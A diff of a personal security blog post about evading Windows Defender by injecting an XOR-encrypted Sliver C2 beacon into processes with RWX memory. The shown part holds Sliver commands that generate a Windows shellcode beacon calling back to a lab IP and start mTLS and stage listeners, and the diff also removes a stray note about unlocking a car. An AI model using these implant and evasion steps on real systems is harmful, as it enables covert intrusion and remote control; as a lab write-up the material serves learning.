@@ -9,11 +9,8 @@ draft = false
 So I've been doing some couples of malware academy modules and reverse engineering malwares, but i've never tried to officially bypass windows defender and inject a shellcode. So, I’ve been trying a simple defense evasion technique for windows defender by enumerating processes with a RWX Protected memory region to inject my sliver beacon combined with XOR encryption. One point to note is that, even though it bypasses windows defender antivirus, that doesn't mean that it does not leave other IOC's and to apply this in a real world scenario would require additional stealth features. In this blog, I'll talk about my successes and challenges.
 
 
->[!warning] Warnigng
->Be ready to read a real
+>⚠️ Be ready to be disappointed...
 
->[!warning] Important
->Important to note, that I did not take any pictures, only a video showing the unlocking of the car. Sadly, I don't really have access to the car anymore to take pictures of the processes, but I will be detailing the thought processes and the hurdles we faced throughout this experience
 
 ---
 
@@ -23,8 +20,7 @@ So I've been doing some couples of malware academy modules and reverse engineeri
 
 1. Generating beacon profile implant : `profiles new beacon --mtls 192.168.38.128 --os windows --arch amd64 --format shellcode --seconds 5 --jitter 3 win_implant`
 
->[!warning]
-> `--skip-symbols` disables obfuscation
+>⚠️`--skip-symbols` disables obfuscation
 
 2. Starting the mtls listener : `mtls`
 3. Starting the stage listener : `stage-listener --url tcp://192.168.38.128:8443 --profile win_implant`
